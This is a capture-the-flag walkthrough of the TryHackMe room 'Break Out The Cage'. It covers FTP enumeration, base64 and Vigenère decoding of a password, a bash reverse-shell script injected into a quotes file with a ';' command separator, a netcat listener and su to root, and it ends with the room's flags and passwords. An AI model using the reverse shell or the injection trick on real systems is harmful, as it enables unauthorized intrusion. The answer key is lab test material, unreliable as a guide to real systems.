# Break Out The Cage

Help Cage bring back his acting career and investigate the nefarious goings on of his agent!

[Break Out The Cage](https://tryhackme.com/room/breakoutthecage1)

## Topic's

- Network ENumeration
- FTP Enumeration
- Cryptography
  - Base64
  - Vigenère
- Abusing SUID/GUID
- Stored Passwords & Keys

## Appendix archive

Password: `1 kn0w 1 5h0uldn'7!`

## Task 1 Investigate!

Let's find out what his agent is up to....

```
kali@kali:~/CTFs/tryhackme/Break Out The Cage$ sudo nmap -A -p- -sS -sC -sV -O 10.10.192.136
[sudo] password for kali:
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-10 20:36 CEST
Nmap scan report for 10.10.192.136
Host is up (0.034s latency).
Not shown: 65532 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0             396 May 25 23:33 dad_tasks
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:10.8.106.222
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 dd:fd:88:94:f8:c8:d1:1b:51:e3:7d:f8:1d:dd:82:3e (RSA)
|   256 3e:ba:38:63:2b:8d:1c:68:13:d5:05:ba:7a:ae:d9:3b (ECDSA)
|_  256 c0:a6:a3:64:44:1e:cf:47:5f:85:f6:1f:78:4c:59:d8 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Nicholas Cage Stories
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=10/10%OT=21%CT=1%CU=40844%PV=Y%DS=2%DC=T%G=Y%TM=5F81FF
OS:5F%P=x86_64-pc-linux-gnu)SEQ(SP=100%GCD=1%ISR=108%TI=Z%CI=Z%II=I%TS=A)OP
OS:S(O1=M508ST11NW6%O2=M508ST11NW6%O3=M508NNT11NW6%O4=M508ST11NW6%O5=M508ST
OS:11NW6%O6=M508ST11)WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)EC
OS:N(R=Y%DF=Y%T=40%W=F507%O=M508NNSNW6%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=
OS:AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(
OS:R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%
OS:F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N
OS:%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%C
OS:D=S)

Network Distance: 2 hops
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 3389/tcp)
HOP RTT      ADDRESS
1   38.18 ms 10.8.0.1
2   38.26 ms 10.10.192.136

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 64.32 seconds
```

```
kali@kali:~/CTFs/tryhackme/Break Out The Cage$ ftp 10.10.192.136
Connected to 10.10.192.136.
220 (vsFTPd 3.0.3)
Name (10.10.192.136:kali): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -la
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 0        0            4096 May 25 23:32 .
drwxr-xr-x    2 0        0            4096 May 25 23:32 ..
-rw-r--r--    1 0        0             396 May 25 23:33 dad_tasks
226 Directory send OK.
ftp> get dad_tasks
local: dad_tasks remote: dad_tasks
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for dad_tasks (396 bytes).
226 Transfer complete.
396 bytes received in 0.08 secs (4.6068 kB/s)
ftp>
```

```
kali@kali:~/CTFs/tryhackme/Break Out The Cage$ cat dad_tasks
UWFwdyBFZWtjbCAtIFB2ciBSTUtQLi4uWFpXIFZXVVIuLi4gVFRJIFhFRi4uLiBMQUEgWlJHUVJPISEhIQpTZncuIEtham5tYiB4c2kgb3d1b3dnZQpGYXouIFRtbCBma2ZyIHFnc2VpayBhZyBvcWVpYngKRWxqd3guIFhpbCBicWkgYWlrbGJ5d3FlClJzZnYuIFp3ZWwgdnZtIGltZWwgc3VtZWJ0IGxxd2RzZmsKWWVqci4gVHFlbmwgVnN3IHN2bnQgInVycXNqZXRwd2JuIGVpbnlqYW11IiB3Zi4KCkl6IGdsd3cgQSB5a2Z0ZWYuLi4uIFFqaHN2Ym91dW9leGNtdndrd3dhdGZsbHh1Z2hoYmJjbXlkaXp3bGtic2lkaXVzY3ds
kali@kali:~/CTFs/tryhackme/Break Out The Cage$ cat dad_tasks | base64 -d
Qapw Eekcl - Pvr RMKP...XZW VWUR... TTI XEF... LAA ZRGQRO!!!!
Sfw. Kajnmb xsi owuowge
Faz. Tml fkfr qgseik ag oqeibx
Eljwx. Xil bqi aiklbywqe
Rsfv. Zwel vvm imel sumebt lqwdsfk
Yejr. Tqenl Vsw svnt "urqsjetpwbn einyjamu" wf.

Iz glww A ykftef.... Qjhsvbouuoexcmvwkwwatfllxughhbbcmydizwlkbsidiuscwl
```

[https://www.guballa.de/vigenere-solver](https://www.guballa.de/vigenere-solver)

`Clear text using key "namelesstwo":`

```
Dads Tasks - The RAGE...THE CAGE... THE MAN... THE LEGEND!!!!
One. Revamp the website
Two. Put more quotes in script
Three. Buy bee pesticide
Four. Help him with acting lessons
Five. Teach Dad what "information security" is.

In case I forget.... Mydadisghostrideraintthatcoolnocausehesonfirejokes
```

```
weston@national-treasure:~$ cat > /tmp/shell.sh << EOF
> #!/bin/bash
> bash -i >& /dev/tcp/10.9.0.54/4444 0>&1
> EOF
weston@national-treasure:~$ chmod +x /tmp/shell.sh
weston@national-treasure:~$ printf 'anything;/tmp/shell.sh\n' > /opt/.dads_scripts/.files/.quotes
weston@national-treasure:~$
```

```
cat > /tmp/shell.sh << EOF
#!/bin/bash
bash -i >& /dev/tcp/10.8.106.222/4444 0>&1
EOF
```

```
kali@kali:~/CTFs/tryhackme/Break Out The Cage$ nc -nlvp 4444
listening on [any] 4444 ...
connect to [10.8.106.222] from (UNKNOWN) [10.10.192.136] 52588
bash: cannot set terminal process group (1583): Inappropriate ioctl for device
bash: no job control in this shell
cage@national-treasure:~$ ls -la
ls -la
total 56
drwx------ 7 cage cage 4096 May 26 21:34 .
drwxr-xr-x 4 root root 4096 May 26 07:49 ..
lrwxrwxrwx 1 cage cage    9 May 26 07:53 .bash_history -> /dev/null
-rw-r--r-- 1 cage cage  220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 cage cage 3771 Apr  4  2018 .bashrc
drwx------ 2 cage cage 4096 May 25 23:20 .cache
drwxrwxr-x 2 cage cage 4096 May 25 13:00 email_backup
drwx------ 3 cage cage 4096 May 25 23:20 .gnupg
drwxrwxr-x 3 cage cage 4096 May 25 23:40 .local
-rw-r--r-- 1 cage cage  807 Apr  4  2018 .profile
-rw-rw-r-- 1 cage cage   66 May 25 23:40 .selected_editor
drwx------ 2 cage cage 4096 May 26 07:33 .ssh
-rw-r--r-- 1 cage cage    0 May 25 23:20 .sudo_as_admin_successful
-rw-rw-r-- 1 cage cage  230 May 26 08:01 Super_Duper_Checklist
-rw------- 1 cage cage 6761 May 26 21:34 .viminfo
cage@national-treasure:~$ cat Super_Duper_Checklist
cat Super_Duper_Checklist
1 - Increase acting lesson budget by at least 30%
2 - Get Weston to stop wearing eye-liner
3 - Get a new pet octopus
4 - Try and keep current wife
5 - Figure out why Weston has this etched into his desk: THM{M37AL_0R_P3N_T35T1NG}
cage@national-treasure:~$ cat email_backup/*
cat email_backup/*
From - SeanArcher@BigManAgents.com
To - Cage@nationaltreasure.com

Hey Cage!

There's rumours of a Face/Off sequel, Face/Off 2 - Face On. It's supposedly only in the
planning stages at the moment. I've put a good word in for you, if you're lucky we
might be able to get you a part of an angry shop keeping or something? Would you be up
for that, the money would be good and it'd look good on your acting CV.

Regards

Sean Archer
From - Cage@nationaltreasure.com
To - SeanArcher@BigManAgents.com

Dear Sean

We've had this discussion before Sean, I want bigger roles, I'm meant for greater things.
Why aren't you finding roles like Batman, The Little Mermaid(I'd make a great Sebastian!),
the new Home Alone film and why oh why Sean, tell me why Sean. Why did I not get a role in the
new fan made Star Wars films?! There was 3 of them! 3 Sean! I mean yes they were terrible films.
I could of made them great... great Sean.... I think you're missing my true potential.

On a much lighter note thank you for helping me set up my home server, Weston helped too, but
not overally greatly. I gave him some smaller jobs. Whats your username on here? Root?

Yours

Cage
From - Cage@nationaltreasure.com
To - Weston@nationaltreasure.com

Hey Son

Buddy, Sean left a note on his desk with some really strange writing on it. I quickly wrote
down what it said. Could you look into it please? I think it could be something to do with his
account on here. I want to know what he's hiding from me... I might need a new agent. Pretty
sure he's out to get me. The note said:

haiinspsyanileph

The guy also seems obsessed with my face lately. He came him wearing a mask of my face...
was rather odd. Imagine wearing his ugly face.... I wouldnt be able to FACE that!!
hahahahahahahahahahahahahahahaahah get it Weston! FACE THAT!!!! hahahahahahahhaha
ahahahhahaha. Ahhh Face it... he's just odd.

Regards

The Legend - Cage
```

```
cage@national-treasure:~$ python -c 'import pty; pty.spawn("/bin/bash")'
python -c 'import pty; pty.spawn("/bin/bash")'
cage@national-treasure:~$ clear
clear
TERM environment variable not set.
cage@national-treasure:~$ su root
su root
Password: cageisnotalegend

root@national-treasure:/home/cage# cd /root
cd /root
root@national-treasure:~# ls -la
ls -la
total 52
drwx------  8 root root  4096 May 26 09:16 .
drwxr-xr-x 24 root root  4096 May 26 07:51 ..
lrwxrwxrwx  1 root root     9 May 26 07:52 .bash_history -> /dev/null
-rw-r--r--  1 root root  3106 Apr  9  2018 .bashrc
drwx------  2 root root  4096 May 26 08:15 .cache
drwxr-xr-x  2 root root  4096 May 25 19:25 email_backup
drwx------  3 root root  4096 May 26 08:15 .gnupg
drwxr-xr-x  3 root root  4096 May 25 23:31 .local
-rw-r--r--  1 root root   148 Aug 17  2015 .profile
drwx------  2 root root  4096 May 25 23:19 .ssh
drwxr-xr-x  2 root root  4096 May 26 08:36 .vim
-rw-------  1 root root 11692 May 26 09:16 .viminfo
root@national-treasure:~# cd email_backup
cd email_backup
root@national-treasure:~/email_backup# ls -la
ls -la
total 16
drwxr-xr-x 2 root root 4096 May 25 19:25 .
drwx------ 8 root root 4096 May 26 09:16 ..
-rw-r--r-- 1 root root  318 May 25 13:19 email_1
-rw-r--r-- 1 root root  414 May 25 14:00 email_2
root@national-treasure:~/email_backup# cat email_1
cat email_1
From - SeanArcher@BigManAgents.com
To - master@ActorsGuild.com

Good Evening Master

My control over Cage is becoming stronger, I've been casting him into worse and worse roles.
Eventually the whole world will see who Cage really is! Our masterplan is coming together
master, I'm in your debt.

Thank you

Sean Archer
root@national-treasure:~/email_backup# cat email_2
cat email_2
From - master@ActorsGuild.com
To - SeanArcher@BigManAgents.com

Dear Sean

I'm very pleased to here that Sean, you are a good disciple. Your power over him has become
strong... so strong that I feel the power to promote you from disciple to crony. I hope you
don't abuse your new found strength. To ascend yourself to this level please use this code:

THM{8R1NG_D0WN_7H3_C493_L0N9_L1V3_M3}

Thank you

Sean Archer
root@national-treasure:~/email_backup# ^C
kali@kali:~/CTFs/tryhackme/Break Out The Cage$
```

`cageisnotalegend`

1. What is Weston's password?

`Mydadisghostrideraintthatcoolnocausehesonfirejokes`

2. What's the user flag?

`THM{M37AL_0R_P3N_T35T1NG}`

3. What's the root flag?

`THM{8R1NG_D0WN_7H3_C493_L0N9_L1V3_M3}`
